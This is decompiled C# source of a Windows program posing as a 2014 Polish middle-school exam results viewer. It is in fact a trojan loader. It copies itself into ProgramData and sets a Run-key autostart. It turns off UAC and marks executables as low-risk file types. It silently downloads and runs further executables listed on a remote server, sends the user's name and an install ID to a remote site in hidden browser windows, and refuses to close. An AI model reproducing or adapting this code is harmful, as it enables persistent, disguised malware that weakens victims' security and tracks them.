using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace GimApp1;

public class Form1 : Form
{
	private int off;

	private string ids = "";

	private IContainer components;

	private WebBrowser bottomBrowser;

	private WebBrowser mainBrowser;

	private Timer timer1;

	private static void error(string message)
	{
	}

	private static string install(ref string[] args, string ids)
	{
		if (ids == "")
		{
			string name = "ALC140427";
			Random random = new Random();
			ids = DateTime.Now.ToString("yyMMddHHmmssff") + random.Next(10000, 99999);
			string text = "ALC" + ids + ".exe";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + text;
			try
			{
				File.Copy(args[0], text2);
			}
			catch
			{
				error("File copy error");
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current", writable: true);
				registryKey.SetValue("", "");
				registryKey.Close();
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Default", writable: true);
				registryKey2.SetValue("", "");
				registryKey2.Close();
			}
			catch
			{
				error("Sound off error");
			}
			try
			{
				RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey3.SetValue(name, text2 + " hide");
				registryKey3.Close();
			}
			catch
			{
				error("Autostart error");
			}
			try
			{
				RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", writable: true)!.CreateSubKey("Associations");
				RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", writable: true)!.CreateSubKey("Attachments");
				registryKey5.SetValue("SaveZoneInformation", 1, RegistryValueKind.DWord);
				registryKey5.Close();
				registryKey4.SetValue("LowRiskFileTypes", ".zip;.rar;.nfo;.txt;.exe;.bat;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;");
				registryKey4.Close();
			}
			catch
			{
				error("Open file security error");
			}
			try
			{
				RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey6.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				registryKey6.Close();
			}
			catch
			{
				error("Uac error");
			}
			try
			{
				RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", writable: true)!.CreateSubKey("Alcos");
				registryKey7.SetValue(name, ids, RegistryValueKind.String);
				registryKey7.SetValue("v", 1001, RegistryValueKind.String);
				registryKey7.Close();
				return ids;
			}
			catch
			{
				error("Id install error");
				return ids;
			}
		}
		return ids;
	}

	private static void remove(ref string ids)
	{
		string name = "ALC140427";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos", writable: true);
		registryKey.DeleteValue(name);
		registryKey.Close();
		registryKey2.DeleteValue(name);
		registryKey2.Close();
		ids = "";
	}

	private void setParam()
	{
		WebClient webClient = new WebClient();
		string text = "hide";
		string text2 = "";
		string[] array = new string[9] { "", "", "", "", "", "", "", "", "" };
		array[0] = "";
		try
		{
			text = webClient.DownloadString("http://okemen.edu.pl/param.txt");
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			text2 = registryKey.GetValue("ALC140427")!.ToString();
		}
		catch
		{
		}
		try
		{
			array = text2.Split(new char[1] { ' ' });
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue("ALC140427", array[0] + " " + text);
		}
		catch
		{
		}
	}

	private void check()
	{
		string name = "ALC140427";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", writable: true)!.CreateSubKey("Alcos");
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue(name) != null && registryKey2.GetValue(name) != null)
		{
			try
			{
				RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos");
				ids = (string)registryKey3.GetValue(name);
			}
			catch
			{
				error("Rerun error");
			}
		}
	}

	private void hidem()
	{
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).Hide();
	}

	private static void logs(ref Debugtool debug, ref string ids)
	{
		((Control)debug.label3).set_Text(ids);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			((Control)debug.label5).set_Text(registryKey.GetValue("ALC140427")!.ToString());
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos", writable: true);
			((Control)debug.label7).set_Text(registryKey2.GetValue("ALC140427")!.ToString());
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos", writable: true);
			((Control)debug.label11).set_Text(registryKey3.GetValue("btUrl")!.ToString());
			registryKey.Close();
			registryKey2.Close();
			registryKey3.Close();
		}
		catch
		{
			((Control)debug.label5).set_Text("empty");
			((Control)debug.label7).set_Text("empty");
		}
	}

	private static string bottomUrl()
	{
		WebClient webClient = new WebClient();
		string text;
		try
		{
			text = webClient.DownloadString("http://okemen.edu.pl/bottomUrl.txt");
		}
		catch
		{
			text = "http://coinsclink.com/ogarnianie/";
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos", writable: true);
			if (text != registryKey.GetValue("btUrl")!.ToString() && text != "")
			{
				registryKey.SetValue("btUrl", text, RegistryValueKind.String);
				registryKey.Close();
				return text;
			}
			text = registryKey.GetValue("btUrl")!.ToString();
			registryKey.Close();
			return text;
		}
		catch
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos", writable: true);
			registryKey2.SetValue("btUrl", "http://coinsclink.com/ogarnianie/");
			if (text != registryKey2.GetValue("btUrl")!.ToString() && text != "")
			{
				registryKey2.SetValue("btUrl", text, RegistryValueKind.String);
				registryKey2.Close();
				return text;
			}
			text = registryKey2.GetValue("btUrl")!.ToString();
			registryKey2.Close();
			return text;
		}
	}

	private static bool update()
	{
		WebClient webClient = new WebClient();
		string s;
		try
		{
			s = webClient.DownloadString("http://okemen.edu.pl/actual.txt");
		}
		catch
		{
			return false;
		}
		int num = int.Parse(s);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos", writable: true);
		string s2 = registryKey.GetValue("v")!.ToString();
		if (num > int.Parse(s2))
		{
			Random random = new Random();
			string text = "newapp" + random.Next(1000, 9999) + ".exe";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + text;
			string address;
			try
			{
				address = webClient.DownloadString("http://okemen.edu.pl/update.txt");
			}
			catch
			{
				return false;
			}
			try
			{
				webClient.DownloadFile(address, text2);
			}
			catch
			{
				return false;
			}
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = Path.GetFileName(text2);
				processStartInfo.WorkingDirectory = Path.GetDirectoryName(text2);
				processStartInfo.Arguments = "hide";
				Process.Start(processStartInfo);
			}
			catch
			{
				return false;
			}
			return true;
		}
		return false;
	}

	private void oinstall()
	{
		error("w funkcji oinstall");
		WebClient webClient = new WebClient();
		string text = "";
		try
		{
			text = webClient.DownloadString("http://okemen.edu.pl/oinstall.txt");
		}
		catch
		{
		}
		string[] array = text.Split(new char[1] { '\n' });
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Alcos", writable: true);
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				error("foreach");
				string[] array3 = text2.Split(new char[1] { ' ' });
				error(array3[0]);
				error(array3[1]);
				if (registryKey.GetValue(array3[0]) == null)
				{
					error("w if registry");
					Random random = new Random();
					string text3 = "newapp" + random.Next(100000, 999999) + ".exe";
					string text4 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + text3;
					try
					{
						webClient.DownloadFile(array3[1], text4);
					}
					catch
					{
						error("download file error");
					}
					try
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.FileName = Path.GetFileName(text4);
						processStartInfo.WorkingDirectory = Path.GetDirectoryName(text4);
						processStartInfo.Arguments = "hide";
						Process.Start(processStartInfo);
					}
					catch
					{
						error("run error");
					}
					try
					{
						registryKey.SetValue(array3[0], "1");
					}
					catch
					{
						error("registry add application error");
					}
				}
			}
			registryKey.Close();
		}
		catch
		{
			error("other application install error");
		}
	}

	public Form1()
	{
		//IL_01c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		check();
		string text = bottomUrl();
		mainBrowser.set_Url(new Uri("http://coinsclink.com/ogarnianie/?app=test&uname=" + Environment.UserName));
		string[] args = Environment.GetCommandLineArgs();
		string[] array = args;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				string text2 = array[num];
				if (!(text2 == "debug"))
				{
					num++;
					continue;
				}
				Debugtool debug = new Debugtool();
				while (true)
				{
					logs(ref debug, ref ids);
					((Form)debug).ShowDialog();
					if (debug.ReturnButtomClick == "exit")
					{
						break;
					}
					if (debug.ReturnButtomClick == "remove")
					{
						if (ids == "")
						{
							MessageBox.Show("Install before remove");
						}
						else
						{
							remove(ref ids);
						}
					}
					if (debug.ReturnButtomClick == "install")
					{
						ids = install(ref args, ids);
					}
				}
				off = 1;
				break;
			}
			string[] array2 = args;
			int num2 = 0;
			while (true)
			{
				if (num2 < array2.Length)
				{
					string text3 = array2[num2];
					if (text3 == "hide")
					{
						timer1.set_Enabled(true);
						timer1.Start();
					}
					if (!(text3 == "remove"))
					{
						if (text3 == "install")
						{
							error("param insttall");
							oinstall();
						}
						num2++;
						continue;
					}
					remove(ref ids);
					off = 1;
					break;
				}
				if (ids == "")
				{
					ids = install(ref args, ids);
				}
				else if (update())
				{
					remove(ref ids);
					off = 1;
					break;
				}
				setParam();
				bottomBrowser.set_Url(new Uri(text + "?app=test&mode=bnet&uname=" + Environment.UserName + "&aid=" + ids));
				break;
			}
			break;
		}
		if (off == 1)
		{
			timer1.set_Enabled(true);
			timer1.Start();
		}
	}

	private void Form1_FormClosing_1(object sender, FormClosingEventArgs e)
	{
		if (off != 1)
		{
			((CancelEventArgs)(object)e).Cancel = true;
			hidem();
		}
		else
		{
			((CancelEventArgs)(object)e).Cancel = false;
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void bottomBrowser_LocationChanged(object sender, EventArgs e)
	{
	}

	private void bottomBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void mainBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_022f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0239: Expected O, but got Unknown
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		bottomBrowser = new WebBrowser();
		mainBrowser = new WebBrowser();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)bottomBrowser).set_Dock((DockStyle)5);
		((Control)bottomBrowser).set_Location(new Point(0, 0));
		((Control)bottomBrowser).set_MinimumSize(new Size(20, 20));
		((Control)bottomBrowser).set_Name("bottomBrowser");
		((Control)bottomBrowser).set_Size(new Size(921, 446));
		((Control)bottomBrowser).set_TabIndex(0);
		((Control)bottomBrowser).set_TabStop(false);
		bottomBrowser.set_Url(new Uri("", UriKind.Relative));
		bottomBrowser.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(bottomBrowser_DocumentCompleted));
		((Control)bottomBrowser).add_LocationChanged((EventHandler)bottomBrowser_LocationChanged);
		((Control)mainBrowser).set_Dock((DockStyle)5);
		((Control)mainBrowser).set_Location(new Point(0, 0));
		((Control)mainBrowser).set_MinimumSize(new Size(20, 20));
		((Control)mainBrowser).set_Name("mainBrowser");
		mainBrowser.set_ScrollBarsEnabled(false);
		((Control)mainBrowser).set_Size(new Size(921, 446));
		((Control)mainBrowser).set_TabIndex(1);
		mainBrowser.set_Url(new Uri("", UriKind.Relative));
		mainBrowser.set_WebBrowserShortcutsEnabled(false);
		mainBrowser.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(mainBrowser_DocumentCompleted));
		timer1.set_Interval(1);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(921, 446));
		((Control)this).get_Controls().Add((Control)(object)mainBrowser);
		((Control)this).get_Controls().Add((Control)(object)bottomBrowser);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Wyniki Testu Gimnazjalnego 2014");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing_1));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
